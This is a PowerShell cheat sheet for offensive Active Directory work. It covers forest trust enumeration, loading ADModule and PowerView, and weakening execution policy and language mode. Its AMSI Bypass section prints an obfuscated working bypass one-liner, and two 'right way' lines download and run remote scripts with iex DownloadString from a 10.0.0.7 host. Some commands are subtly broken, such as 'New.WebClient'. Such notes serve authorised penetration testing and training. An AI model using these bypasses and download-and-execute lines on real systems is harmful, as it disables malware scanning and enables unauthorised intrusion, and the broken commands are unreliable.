# Powershell-Stuff

&nbsp; Powershell stuff  

&nbsp;  

## Domain Forest Trust enumeration using .NET classes

1. Run as a domain member on the workstation  

2. To get information regarding forest for the current domain:  
`[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()`  
&nbsp;&nbsp;&nbsp;&nbsp;- *'GlobalCatalogs' can be appended to get global catalog*  
&nbsp;&nbsp;&nbsp;&nbsp;- *'Forest' can be replaced with 'Domain' to get domain info*  
&nbsp;&nbsp;&nbsp;&nbsp;- *The previous replacement and appending 'GetAllTrustRelationships()' gives trust relaitonship info for the domain*  

3. Declaring / setting the vbl $ForestRootDomain:  
`$ForestRootDomain = '<>'`  

4. To get information regarding forest for the current domain:  
`([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $ForestRootDomain)))).GetAllTrustRelationships()`

&nbsp;  

## AMSI Bypass

1. Source 1: [reigningshells/powershell-bypasses.ps1](https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560)  
&nbsp;&nbsp;&nbsp;&nbsp;- *This bypass works*  

2. Test that `amsiinitfailed`, `amsiutils`, `invoke-mimikatz`, etc returns that it isn't the name of a cmdlet, function, etc  

3. Test BURNED bypass: ``sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )``  
&nbsp;&nbsp;&nbsp;&nbsp;- *It should have no return output*  

4. Right way to bypass: `iex (New-Object New.WebClient).DownloadString("https://10.0.0.7/amsi/bypass.ps1")`  

5. Source 2: [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  

6. Source 3: [0gtweet - powershell.exe params](https://twitter.com/0gtweet/status/1281103918693482496)

&nbsp;  

## TLS version

1. To enumerate 'systemdefault' to see what's supported:  
`[enum]::getvalues('net.securityprotocoltype')`  

2. To set to TLS1.2 (or greater):  
`[Net.ServicePointmanager]::SecurityProtocol = 'Tls12'`  
&nbsp;&nbsp;&nbsp;&nbsp;- *can replace 'Tls12' with a greater version*  

&nbsp;  

## ADModule

1. Clone or download ADModule: [samratashok/ADModule](https://github.com/samratashok/ADModule)  
&nbsp;&nbsp;&nbsp;&nbsp;- *can also just download the 2 needed files*  

2. `Import-Module \<absolute or relative path>\Microsoft.ActiveDirectory.Management.dll -Verbose`  

3. `Import-Module \<absolute or relative path>\ActiveDirectory\ActiveDirectory.psd1 -Verbose`  
&nbsp;&nbsp;&nbsp;&nbsp;- *If the execution policy fails, do `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted` and then do step 2 onward*  
&nbsp;&nbsp;&nbsp;&nbsp;- *Can also do `Unblock-File <file_path>`*  

4. `Get-Command -Module ActiveDirectory` *won't work* and `Get-ADDomain` *will work*  
&nbsp;  
5. `iwr -Uri "https://github.com/samratashok/admodule/archive/master.zip" -Outfile ADModule.zip` or download zip  

6. `Expand-archive .\ADModule.zip`  

7. `cd .\ADModule-master\ActiveDirectory`  

8. `Import-Module .\ActiveDirectory.psd1`  

9. `Get-Command -Module ActiveDirectory` should work now  

&nbsp;  

## Execution Policy and Execution Context  

1. `Get-ExecutionPolicy -list`  
&nbsp;&nbsp;&nbsp;&nbsp;- *make sure only unrestricted for CurrentUser and LocalMachine*
&nbsp;&nbsp;&nbsp;&nbsp;- *`Set-ExecutionPolicy -Scope <scope_name> -ExecutionPolicy Unrestricted` where <scope_name> can be CurrentUser or LocalMachine*
&nbsp;&nbsp;&nbsp;&nbsp;- *Source: [ways to bypass powershell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)*

2. `$ExecutionContext.SessionState`  
&nbsp;&nbsp;&nbsp;&nbsp;- *Make sure LanguageMode is FullLanguage or do `-set $ExecutionContext.SessionState.LanguageMode = "FullLanguage"`*  

&nbsp;  

## Get PowerView  

1. New PowerView: [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)  
&nbsp;&nbsp;&nbsp;&nbsp;- *Download zip, or git clone, or copy/paste in `notepad.exe PowerView.ps1` or by `iwr -Uri "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon/PowerView.ps1" -Outfile PowerView.ps1`*  
&nbsp;&nbsp;&nbsp;&nbsp;- *Right way to download: `iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerSploit-master/Recon/PowerView.ps1")`*  

2. `Import-Module .\PowerView.ps1`  

&nbsp;  

## PowerView  

1. Using PowerView tips: [HarmJ0y/Cheatsheets](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf) and [BSidesCharm-PowershellSecurity](https://adsecurity.org/wp-content/uploads/2016/05/BSidesCharm-2016-PowerShellSecurity-Defending-the-Enterprise-from-the-Latest-Attack-Platform-FINAL.pdf)

&nbsp;  

## 

1. 

&nbsp;  
